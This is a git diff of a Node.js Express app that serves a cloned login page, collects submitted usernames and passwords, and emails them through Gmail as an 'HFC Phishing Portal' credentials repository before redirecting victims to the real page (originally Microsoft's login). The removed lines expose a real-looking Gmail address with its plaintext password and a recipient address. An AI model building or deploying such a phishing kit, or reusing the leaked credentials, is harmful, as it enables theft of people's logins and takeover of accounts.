@@ -7,46 +7,44 @@ const nodemailer = require('nodemailer')
 
 const app = express();
 
-// app = connect().use(connect.static(__dirname + '/public'))
-
 //view engine setup
-
 app.engine('handlebars',exphbs())
 app.set('view engine','handlebars')
 
 // Static folder
-
 app.use('/public', express.static(path.join(__dirname,'public')))
 
-
 // Body parser Middleware
-
 app.use(bodyParser.urlencoded({ extended: false }))
 app.use(bodyParser.json())
 
+//render cloned page
+//default view in views/contact.handlebars
 app.get('/',(req, res) => {
 	res.render('contact')
 })
 
-app.post('/send',(req, res) => {
+//send email
+//use body parser to get req details from form
+app.post('/send', (req, res) => {
 	console.log(req.body)
 	const output = `
 		<p>You have a new password entry from HFC Phishing Portal</p>
 		<h3>User Details</h3>
 		<ul>
 			<li>Name: ${req.body.username}</li>
-			<li>Password: </li>
+			<li>Password:${req.body.username}</li>
 		</ul>
 	`
 
-	// create reusable transporter object using the default SMTP transport
+	// create reusable transporter object using the default SMTP transport - option to use gmail
     let transporter = nodemailer.createTransport({
         host: 'smtp.gmail.com',
         port: 465,
         secure: true, // true for 465, false for other ports
         auth: {
-            user: 'momanyisamuel48@gmail.com', // generated ethereal user
-            pass: 'Thearrow@485'  // generated ethereal password
+            user: 'your@gmail.com', // generated ethereal user
+            pass: ''  // generated ethereal password
         },
         tls: {
             rejectUnauthorized: false
@@ -55,8 +53,8 @@ app.post('/send',(req, res) => {
 
     // setup email data with unicode symbols
     let mailOptions = {
-        from: '"Serianu Password Repository" <momanyisamuel48@gmail.com>', // sender address
-        to: 'hfcgroup.ke@gmail.com', // list of receivers
+        from: '"Your Password Repository" <your@gmail.com>', // sender address
+        to: 'reciever@gmail.com', // list of receivers
         subject: 'Credentials Repository', // Subject line
         text: 'New Password Crendetial', // plain text body
         html: output // html body
@@ -73,8 +71,7 @@ app.post('/send',(req, res) => {
 
         // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
         // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...
-
-        res.redirect('https://login.microsoftonline.com/')
+        res.redirect('https://originalpage.com/') //original page url
     });
 })
 
